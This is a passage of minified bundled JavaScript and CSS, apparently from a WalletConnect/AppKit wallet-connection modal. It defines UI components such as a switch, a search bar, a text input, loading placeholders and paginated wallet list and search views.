    `:null}async onSelectPlatform(e){const t=this.shadowRoot?.querySelector("div");t&&(await t.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.platform=e,t.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}};p6([te()],g3.prototype,"platform",void 0);p6([te()],g3.prototype,"platforms",void 0);p6([te()],g3.prototype,"isSiwxEnabled",void 0);p6([te()],g3.prototype,"remoteFeatures",void 0);g3=p6([Ot("w3m-connecting-wc-view")],g3);var oae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let xx=class extends he{constructor(){super(...arguments),this.isMobile=Ze.isMobile()}render(){if(this.isMobile){const{featured:e,recommended:t}=rt.state,{customWallets:i}=Be.state,n=Bt.getRecentWallets(),s=e.length||t.length||i?.length||n.length;return F`<wui-flex
        flexDirection="column"
        gap="xs"
        .margin=${["3xs","s","s","s"]}
      >
        ${s?F`<w3m-connector-list></w3m-connector-list>`:null}
        <w3m-all-wallets-widget></w3m-all-wallets-widget>
      </wui-flex>`}return F`<wui-flex flexDirection="column" .padding=${["0","0","l","0"]}>
      <w3m-connecting-wc-view></w3m-connecting-wc-view>
      <wui-flex flexDirection="column" .padding=${["0","m","0","m"]}>
        <w3m-all-wallets-widget></w3m-all-wallets-widget> </wui-flex
    ></wui-flex>`}};oae([te()],xx.prototype,"isMobile",void 0);xx=oae([Ot("w3m-connecting-wc-basic-view")],xx);const Uht=ge`
  :host {
    display: flex;
    align-items: center;
    justify-content: center;
  }

  label {
    position: relative;
    display: inline-block;
    width: 32px;
    height: 22px;
  }

  input {
    width: 0;
    height: 0;
    opacity: 0;
  }

  span {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: var(--wui-color-blue-100);
    border-width: 1px;
    border-style: solid;
    border-color: var(--wui-color-gray-glass-002);
    border-radius: 999px;
    transition:
      background-color var(--wui-ease-inout-power-1) var(--wui-duration-md),
      border-color var(--wui-ease-inout-power-1) var(--wui-duration-md);
    will-change: background-color, border-color;
  }

  span:before {
    position: absolute;
    content: '';
    height: 16px;
    width: 16px;
    left: 3px;
    top: 2px;
    background-color: var(--wui-color-inverse-100);
    transition: transform var(--wui-ease-inout-power-1) var(--wui-duration-lg);
    will-change: transform;
    border-radius: 50%;
  }

  input:checked + span {
    border-color: var(--wui-color-gray-glass-005);
    background-color: var(--wui-color-blue-100);
  }

  input:not(:checked) + span {
    background-color: var(--wui-color-gray-glass-010);
  }

  input:checked + span:before {
    transform: translateX(calc(100% - 7px));
  }
`;var aae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Cx=class extends he{constructor(){super(...arguments),this.inputElementRef=gc(),this.checked=void 0}render(){return F`
      <label>
        <input
          ${mc(this.inputElementRef)}
          type="checkbox"
          ?checked=${ye(this.checked)}
          @change=${this.dispatchChangeEvent.bind(this)}
        />
        <span></span>
      </label>
    `}dispatchChangeEvent(){this.dispatchEvent(new CustomEvent("switchChange",{detail:this.inputElementRef.value?.checked,bubbles:!0,composed:!0}))}};Cx.styles=[Ii,vo,c6,Uht];aae([V({type:Boolean})],Cx.prototype,"checked",void 0);Cx=aae([Ot("wui-switch")],Cx);const jht=ge`
  :host {
    height: 100%;
  }

  button {
    display: flex;
    align-items: center;
    justify-content: center;
    column-gap: var(--wui-spacing-1xs);
    padding: var(--wui-spacing-xs) var(--wui-spacing-s);
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color;
    cursor: pointer;
  }

  wui-switch {
    pointer-events: none;
  }
`;var cae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Ex=class extends he{constructor(){super(...arguments),this.checked=void 0}render(){return F`
      <button>
        <wui-icon size="xl" name="walletConnectBrown"></wui-icon>
        <wui-switch ?checked=${ye(this.checked)}></wui-switch>
      </button>
    `}};Ex.styles=[Ii,vo,jht];cae([V({type:Boolean})],Ex.prototype,"checked",void 0);Ex=cae([Ot("wui-certified-switch")],Ex);const Fht=ge`
  button {
    background-color: var(--wui-color-fg-300);
    border-radius: var(--wui-border-radius-4xs);
    width: 16px;
    height: 16px;
  }

  button:disabled {
    background-color: var(--wui-color-bg-300);
  }

  wui-icon {
    color: var(--wui-color-bg-200) !important;
  }

  button:focus-visible {
    background-color: var(--wui-color-fg-250);
    border: 1px solid var(--wui-color-accent-100);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-fg-250);
    }

    button:active:enabled {
      background-color: var(--wui-color-fg-225);
    }
  }
`;var lae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let _x=class extends he{constructor(){super(...arguments),this.icon="copy"}render(){return F`
      <button>
        <wui-icon color="inherit" size="xxs" name=${this.icon}></wui-icon>
      </button>
    `}};_x.styles=[Ii,vo,Fht];lae([V()],_x.prototype,"icon",void 0);_x=lae([Ot("wui-input-element")],_x);const qht=ge`
  :host {
    position: relative;
    width: 100%;
    display: inline-block;
    color: var(--wui-color-fg-275);
  }

  input {
    width: 100%;
    border-radius: var(--wui-border-radius-xs);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    background: var(--wui-color-gray-glass-002);
    font-size: var(--wui-font-size-paragraph);
    letter-spacing: var(--wui-letter-spacing-paragraph);
    color: var(--wui-color-fg-100);
    transition:
      background-color var(--wui-ease-inout-power-1) var(--wui-duration-md),
      border-color var(--wui-ease-inout-power-1) var(--wui-duration-md),
      box-shadow var(--wui-ease-inout-power-1) var(--wui-duration-md);
    will-change: background-color, border-color, box-shadow;
    caret-color: var(--wui-color-accent-100);
  }

  input:disabled {
    cursor: not-allowed;
    border: 1px solid var(--wui-color-gray-glass-010);
  }

  input:disabled::placeholder,
  input:disabled + wui-icon {
    color: var(--wui-color-fg-300);
  }

  input::placeholder {
    color: var(--wui-color-fg-275);
  }

  input:focus:enabled {
    background-color: var(--wui-color-gray-glass-005);
    -webkit-box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0px 0px 0px 4px var(--wui-box-shadow-blue);
  }

  input:hover:enabled {
    background-color: var(--wui-color-gray-glass-005);
  }

  wui-icon {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    pointer-events: none;
  }

  .wui-size-sm {
    padding: 9px var(--wui-spacing-m) 10px var(--wui-spacing-s);
  }

  wui-icon + .wui-size-sm {
    padding: 9px var(--wui-spacing-m) 10px 36px;
  }

  wui-icon[data-input='sm'] {
    left: var(--wui-spacing-s);
  }

  .wui-size-md {
    padding: 15px var(--wui-spacing-m) var(--wui-spacing-l) var(--wui-spacing-m);
  }

  wui-icon + .wui-size-md,
  wui-loading-spinner + .wui-size-md {
    padding: 10.5px var(--wui-spacing-3xl) 10.5px var(--wui-spacing-3xl);
  }

  wui-icon[data-input='md'] {
    left: var(--wui-spacing-l);
  }

  .wui-size-lg {
    padding: var(--wui-spacing-s) var(--wui-spacing-s) var(--wui-spacing-s) var(--wui-spacing-l);
    letter-spacing: var(--wui-letter-spacing-medium-title);
    font-size: var(--wui-font-size-medium-title);
    font-weight: var(--wui-font-weight-light);
    line-height: 130%;
    color: var(--wui-color-fg-100);
    height: 64px;
  }

  .wui-padding-right-xs {
    padding-right: var(--wui-spacing-xs);
  }

  .wui-padding-right-s {
    padding-right: var(--wui-spacing-s);
  }

  .wui-padding-right-m {
    padding-right: var(--wui-spacing-m);
  }

  .wui-padding-right-l {
    padding-right: var(--wui-spacing-l);
  }

  .wui-padding-right-xl {
    padding-right: var(--wui-spacing-xl);
  }

  .wui-padding-right-2xl {
    padding-right: var(--wui-spacing-2xl);
  }

  .wui-padding-right-3xl {
    padding-right: var(--wui-spacing-3xl);
  }

  .wui-padding-right-4xl {
    padding-right: var(--wui-spacing-4xl);
  }

  .wui-padding-right-5xl {
    padding-right: var(--wui-spacing-5xl);
  }

  wui-icon + .wui-size-lg,
  wui-loading-spinner + .wui-size-lg {
    padding-left: 50px;
  }

  wui-icon[data-input='lg'] {
    left: var(--wui-spacing-l);
  }

  .wui-size-mdl {
    padding: 17.25px var(--wui-spacing-m) 17.25px var(--wui-spacing-m);
  }
  wui-icon + .wui-size-mdl,
  wui-loading-spinner + .wui-size-mdl {
    padding: 17.25px var(--wui-spacing-3xl) 17.25px 40px;
  }
  wui-icon[data-input='mdl'] {
    left: var(--wui-spacing-m);
  }

  input:placeholder-shown ~ ::slotted(wui-input-element),
  input:placeholder-shown ~ ::slotted(wui-icon) {
    opacity: 0;
    pointer-events: none;
  }

  input::-webkit-outer-spin-button,
  input::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }

  input[type='number'] {
    -moz-appearance: textfield;
  }

  ::slotted(wui-input-element),
  ::slotted(wui-icon) {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
  }

  ::slotted(wui-input-element) {
    right: var(--wui-spacing-m);
  }

  ::slotted(wui-icon) {
    right: 0px;
  }
`;var ah=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let pl=class extends he{constructor(){super(...arguments),this.inputElementRef=gc(),this.size="md",this.disabled=!1,this.placeholder="",this.type="text",this.value=""}render(){const e=`wui-padding-right-${this.inputRightPadding}`,i={[`wui-size-${this.size}`]:!0,[e]:!!this.inputRightPadding};return F`${this.templateIcon()}
      <input
        data-testid="wui-input-text"
        ${mc(this.inputElementRef)}
        class=${Ow(i)}
        type=${this.type}
        enterkeyhint=${ye(this.enterKeyHint)}
        ?disabled=${this.disabled}
        placeholder=${this.placeholder}
        @input=${this.dispatchInputChangeEvent.bind(this)}
        .value=${this.value||""}
        tabindex=${ye(this.tabIdx)}
      />
      <slot></slot>`}templateIcon(){return this.icon?F`<wui-icon
        data-input=${this.size}
        size=${this.size}
        color="inherit"
        name=${this.icon}
      ></wui-icon>`:null}dispatchInputChangeEvent(){this.dispatchEvent(new CustomEvent("inputChange",{detail:this.inputElementRef.value?.value,bubbles:!0,composed:!0}))}};pl.styles=[Ii,vo,qht];ah([V()],pl.prototype,"size",void 0);ah([V()],pl.prototype,"icon",void 0);ah([V({type:Boolean})],pl.prototype,"disabled",void 0);ah([V()],pl.prototype,"placeholder",void 0);ah([V()],pl.prototype,"type",void 0);ah([V()],pl.prototype,"keyHint",void 0);ah([V()],pl.prototype,"value",void 0);ah([V()],pl.prototype,"inputRightPadding",void 0);ah([V()],pl.prototype,"tabIdx",void 0);pl=ah([Ot("wui-input-text")],pl);const zht=ge`
  :host {
    position: relative;
    display: inline-block;
    width: 100%;
  }
`;var Wht=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let e$=class extends he{constructor(){super(...arguments),this.inputComponentRef=gc()}render(){return F`
      <wui-input-text
        ${mc(this.inputComponentRef)}
        placeholder="Search wallet"
        icon="search"
        type="search"
        enterKeyHint="search"
        size="sm"
      >
        <wui-input-element @click=${this.clearValue} icon="close"></wui-input-element>
      </wui-input-text>
    `}clearValue(){const t=this.inputComponentRef.value?.inputElementRef.value;t&&(t.value="",t.focus(),t.dispatchEvent(new Event("input")))}};e$.styles=[Ii,zht];e$=Wht([Ot("wui-search-bar")],e$);const Hht=xe`<svg  viewBox="0 0 48 54" fill="none">
  <path
    d="M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z"
  />
</svg>`,Vht=ge`
  :host {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 104px;
    row-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-xs) 10px;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: clamp(0px, var(--wui-border-radius-xs), 20px);
    position: relative;
  }

  wui-shimmer[data-type='network'] {
    border: none;
    -webkit-clip-path: var(--wui-path-network);
    clip-path: var(--wui-path-network);
  }

  svg {
    position: absolute;
    width: 48px;
    height: 54px;
    z-index: 1;
  }

  svg > path {
    stroke: var(--wui-color-gray-glass-010);
    stroke-width: 1px;
  }

  @media (max-width: 350px) {
    :host {
      width: 100%;
    }
  }
`;var uae=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Sx=class extends he{constructor(){super(...arguments),this.type="wallet"}render(){return F`
      ${this.shimmerTemplate()}
      <wui-shimmer width="56px" height="20px" borderRadius="xs"></wui-shimmer>
    `}shimmerTemplate(){return this.type==="network"?F` <wui-shimmer
          data-type=${this.type}
          width="48px"
          height="54px"
          borderRadius="xs"
        ></wui-shimmer>
        ${Hht}`:F`<wui-shimmer width="56px" height="56px" borderRadius="xs"></wui-shimmer>`}};Sx.styles=[Ii,vo,Vht];uae([V()],Sx.prototype,"type",void 0);Sx=uae([Ot("wui-card-select-loader")],Sx);const Kht=ge`
  :host {
    display: grid;
    width: inherit;
    height: inherit;
  }
`;var Sl=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let La=class extends he{render(){return this.style.cssText=`
      grid-template-rows: ${this.gridTemplateRows};
      grid-template-columns: ${this.gridTemplateColumns};
      justify-items: ${this.justifyItems};
      align-items: ${this.alignItems};
      justify-content: ${this.justifyContent};
      align-content: ${this.alignContent};
      column-gap: ${this.columnGap&&`var(--wui-spacing-${this.columnGap})`};
      row-gap: ${this.rowGap&&`var(--wui-spacing-${this.rowGap})`};
      gap: ${this.gap&&`var(--wui-spacing-${this.gap})`};
      padding-top: ${this.padding&&Us.getSpacingStyles(this.padding,0)};
      padding-right: ${this.padding&&Us.getSpacingStyles(this.padding,1)};
      padding-bottom: ${this.padding&&Us.getSpacingStyles(this.padding,2)};
      padding-left: ${this.padding&&Us.getSpacingStyles(this.padding,3)};
      margin-top: ${this.margin&&Us.getSpacingStyles(this.margin,0)};
      margin-right: ${this.margin&&Us.getSpacingStyles(this.margin,1)};
      margin-bottom: ${this.margin&&Us.getSpacingStyles(this.margin,2)};
      margin-left: ${this.margin&&Us.getSpacingStyles(this.margin,3)};
    `,F`<slot></slot>`}};La.styles=[Ii,Kht];Sl([V()],La.prototype,"gridTemplateRows",void 0);Sl([V()],La.prototype,"gridTemplateColumns",void 0);Sl([V()],La.prototype,"justifyItems",void 0);Sl([V()],La.prototype,"alignItems",void 0);Sl([V()],La.prototype,"justifyContent",void 0);Sl([V()],La.prototype,"alignContent",void 0);Sl([V()],La.prototype,"columnGap",void 0);Sl([V()],La.prototype,"rowGap",void 0);Sl([V()],La.prototype,"gap",void 0);Sl([V()],La.prototype,"padding",void 0);Sl([V()],La.prototype,"margin",void 0);La=Sl([Ot("wui-grid")],La);const Ght=ge`
  button {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    width: 104px;
    row-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-s) var(--wui-spacing-0);
    background-color: var(--wui-color-gray-glass-002);
    border-radius: clamp(0px, var(--wui-border-radius-xs), 20px);
    transition:
      color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: background-color, color, border-radius;
    outline: none;
    border: none;
  }

  button > wui-flex > wui-text {
    color: var(--wui-color-fg-100);
    max-width: 86px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    justify-content: center;
  }

  button > wui-flex > wui-text.certified {
    max-width: 66px;
  }

  button:hover:enabled {
    background-color: var(--wui-color-gray-glass-005);
  }

  button:disabled > wui-flex > wui-text {
    color: var(--wui-color-gray-glass-015);
  }

  [data-selected='true'] {
    background-color: var(--wui-color-accent-glass-020);
  }

  @media (hover: hover) and (pointer: fine) {
    [data-selected='true']:hover:enabled {
      background-color: var(--wui-color-accent-glass-015);
    }
  }

  [data-selected='true']:active:enabled {
    background-color: var(--wui-color-accent-glass-010);
  }

  @media (max-width: 350px) {
    button {
      width: 100%;
    }
  }
`;var g6=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Fg=class extends he{constructor(){super(),this.observer=new IntersectionObserver(()=>{}),this.visible=!1,this.imageSrc=void 0,this.imageLoading=!1,this.wallet=void 0,this.observer=new IntersectionObserver(e=>{e.forEach(t=>{t.isIntersecting?(this.visible=!0,this.fetchImageSrc()):this.visible=!1})},{threshold:.01})}firstUpdated(){this.observer.observe(this)}disconnectedCallback(){this.observer.disconnect()}render(){const e=this.wallet?.badge_type==="certified";return F`
      <button>
        ${this.imageTemplate()}
        <wui-flex flexDirection="row" alignItems="center" justifyContent="center" gap="3xs">
          <wui-text
            variant="tiny-500"
            color="inherit"
            class=${ye(e?"certified":void 0)}
            >${this.wallet?.name}</wui-text
          >
          ${e?F`<wui-icon size="sm" name="walletConnectBrown"></wui-icon>`:null}
        </wui-flex>
      </button>
    `}imageTemplate(){return!this.visible&&!this.imageSrc||this.imageLoading?this.shimmerTemplate():F`
      <wui-wallet-image
        size="md"
        imageSrc=${ye(this.imageSrc)}
        name=${this.wallet?.name}
        .installed=${this.wallet?.installed}
        badgeSize="sm"
      >
      </wui-wallet-image>
    `}shimmerTemplate(){return F`<wui-shimmer width="56px" height="56px" borderRadius="xs"></wui-shimmer>`}async fetchImageSrc(){this.wallet&&(this.imageSrc=Es.getWalletImage(this.wallet),!this.imageSrc&&(this.imageLoading=!0,this.imageSrc=await Es.fetchWalletImage(this.wallet.image_id),this.imageLoading=!1))}};Fg.styles=Ght;g6([te()],Fg.prototype,"visible",void 0);g6([te()],Fg.prototype,"imageSrc",void 0);g6([te()],Fg.prototype,"imageLoading",void 0);g6([V()],Fg.prototype,"wallet",void 0);Fg=g6([Ot("w3m-all-wallets-list-item")],Fg);const Zht=ge`
  wui-grid {
    max-height: clamp(360px, 400px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
    grid-template-columns: repeat(auto-fill, 104px);
  }

  @media (max-width: 350px) {
    wui-grid {
      grid-template-columns: repeat(2, 1fr);
    }
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-loading-spinner {
    padding-top: var(--wui-spacing-l);
    padding-bottom: var(--wui-spacing-l);
    justify-content: center;
    grid-column: 1 / span 4;
  }
`;var X3=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const XG="local-paginator";let yp=class extends he{constructor(){super(),this.unsubscribe=[],this.paginationObserver=void 0,this.loading=!rt.state.wallets.length,this.wallets=rt.state.wallets,this.recommended=rt.state.recommended,this.featured=rt.state.featured,this.filteredWallets=rt.state.filteredWallets,this.unsubscribe.push(rt.subscribeKey("wallets",e=>this.wallets=e),rt.subscribeKey("recommended",e=>this.recommended=e),rt.subscribeKey("featured",e=>this.featured=e),rt.subscribeKey("filteredWallets",e=>this.filteredWallets=e))}firstUpdated(){this.initialFetch(),this.createPaginationObserver()}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),this.paginationObserver?.disconnect()}render(){return F`
      <wui-grid
        data-scroll=${!this.loading}
        .padding=${["0","s","s","s"]}
        columnGap="xxs"
        rowGap="l"
        justifyContent="space-between"
      >
        ${this.loading?this.shimmerTemplate(16):this.walletsTemplate()}
        ${this.paginationLoaderTemplate()}
      </wui-grid>
    `}async initialFetch(){this.loading=!0;const e=this.shadowRoot?.querySelector("wui-grid");e&&(await rt.fetchWalletsByPage({page:1}),await e.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.loading=!1,e.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}shimmerTemplate(e,t){return[...Array(e)].map(()=>F`
        <wui-card-select-loader type="wallet" id=${ye(t)}></wui-card-select-loader>
      `)}walletsTemplate(){const e=this.filteredWallets?.length>0?Ze.uniqueBy([...this.featured,...this.recommended,...this.filteredWallets],"id"):Ze.uniqueBy([...this.featured,...this.recommended,...this.wallets],"id");return Og.markWalletsAsInstalled(e).map(i=>F`
        <w3m-all-wallets-list-item
          @click=${()=>this.onConnectWallet(i)}
          .wallet=${i}
        ></w3m-all-wallets-list-item>
      `)}paginationLoaderTemplate(){const{wallets:e,recommended:t,featured:i,count:n}=rt.state,s=window.innerWidth<352?3:4,o=e.length+t.length;let c=Math.ceil(o/s)*s-o+s;return c-=e.length?i.length%s:0,n===0&&i.length>0?null:n===0||[...i,...e,...t].length<n?this.shimmerTemplate(c,XG):null}createPaginationObserver(){const e=this.shadowRoot?.querySelector(`#${XG}`);e&&(this.paginationObserver=new IntersectionObserver(([t])=>{if(t?.isIntersecting&&!this.loading){const{page:i,count:n,wallets:s}=rt.state;s.length<n&&rt.fetchWalletsByPage({page:i+1})}}),this.paginationObserver.observe(e))}onConnectWallet(e){We.selectWalletConnector(e)}};yp.styles=Zht;X3([te()],yp.prototype,"loading",void 0);X3([te()],yp.prototype,"wallets",void 0);X3([te()],yp.prototype,"recommended",void 0);X3([te()],yp.prototype,"featured",void 0);X3([te()],yp.prototype,"filteredWallets",void 0);yp=X3([Ot("w3m-all-wallets-list")],yp);const Yht=ge`
  wui-grid,
  wui-loading-spinner,
  wui-flex {
    height: 360px;
  }

  wui-grid {
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
    grid-template-columns: repeat(auto-fill, 104px);
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-loading-spinner {
    justify-content: center;
    align-items: center;
  }

  @media (max-width: 350px) {
    wui-grid {
      grid-template-columns: repeat(2, 1fr);
    }
  }
`;var $E=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let m3=class extends he{constructor(){super(...arguments),this.prevQuery="",this.prevBadge=void 0,this.loading=!0,this.query=""}render(){return this.onSearch(),this.loading?F`<wui-loading-spinner color="accent-100"></wui-loading-spinner>`:this.walletsTemplate()}async onSearch(){(this.query.trim()!==this.prevQuery.trim()||this.badge!==this.prevBadge)&&(this.prevQuery=this.query,this.prevBadge=this.badge,this.loading=!0,await rt.searchWallet({search:this.query,badge:this.badge}),this.loading=!1)}walletsTemplate(){const{search:e}=rt.state,t=Og.markWalletsAsInstalled(e);return e.length?F`
      <wui-grid
        data-testid="wallet-list"
        .padding=${["0","s","s","s"]}
        rowGap="l"
        columnGap="xs"
        justifyContent="space-between"
      >
        ${t.map(i=>F`
            <w3m-all-wallets-list-item
              @click=${()=>this.onConnectWallet(i)}
              .wallet=${i}
              data-testid="wallet-search-item-${i.id}"
            ></w3m-all-wallets-list-item>
          `)}
      </wui-grid>
    `:F`
        <wui-flex
          data-testid="no-wallet-found"
          justifyContent="center"
          alignItems="center"
          gap="s"
          flexDirection="column"
        >
          <wui-icon-box
            size="lg"
            iconColor="fg-200"
            backgroundColor="fg-300"
            icon="wallet"
            background="transparent"
          ></wui-icon-box>
          <wui-text data-testid="no-wallet-found-text" color="fg-200" variant="paragraph-500">
            No Wallet found
          </wui-text>
        </wui-flex>
      `}onConnectWallet(e){We.selectWalletConnector(e)}};m3.styles=Yht;$E([te()],m3.prototype,"loading",void 0);$E([V()],m3.prototype,"query",void 0);$E([V()],m3.prototype,"badge",void 0);m3=$E([Ot("w3m-all-wallets-search")],m3);var $B=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Wy=class extends he{constructor(){super(...arguments),this.search="",this.onDebouncedSearch=Ze.debounce(e=>{this.search=e})}render(){const e=this.search.length>=2;return F`
      <wui-flex .padding=${["0","s","s","s"]} gap="xs">
        <wui-search-bar @inputChange=${this.onInputChange.bind(this)}></wui-search-bar>
        <wui-certified-switch
          ?checked=${this.badge}
          @click=${this.onClick.bind(this)}
          data-testid="wui-certified-switch"
        ></wui-certified-switch>
        ${this.qrButtonTemplate()}
      </wui-flex>
      ${e||this.badge?F`<w3m-all-wallets-search
            query=${this.search}
            badge=${ye(this.badge)}
          ></w3m-all-wallets-search>`:F`<w3m-all-wallets-list badge=${ye(this.badge)}></w3m-all-wallets-list>`}
    `}onInputChange(e){this.onDebouncedSearch(e.detail)}onClick(){if(this.badge==="certified"){this.badge=void 0;return}this.badge="certified",ts.showSvg("Only WalletConnect certified",{icon:"walletConnectBrown",iconColor:"accent-100"})}qrButtonTemplate(){return Ze.isMobile()?F`
        <wui-icon-box
          size="lg"
          iconSize="xl"
          iconColor="accent-100"
          backgroundColor="accent-100"
          icon="qrCode"
          background="transparent"
          border
          borderColor="wui-accent-glass-010"
          @click=${this.onWalletConnectQr.bind(this)}
        ></wui-icon-box>
      `:null}onWalletConnectQr(){tt.push("ConnectingWalletConnect")}};$B([te()],Wy.prototype,"search",void 0);$B([te()],Wy.prototype,"badge",void 0);Wy=$B([Ot("w3m-all-wallets-view")],Wy);const Jht=ge`
  button {
    column-gap: var(--wui-spacing-s);
    padding: 11px 18px 11px var(--wui-spacing-s);
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-250);
    transition:
      color var(--wui-ease-out-power-1) var(--wui-duration-md),
      background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: color, background-color;
  }

  button[data-iconvariant='square'],
  button[data-iconvariant='square-blue'] {
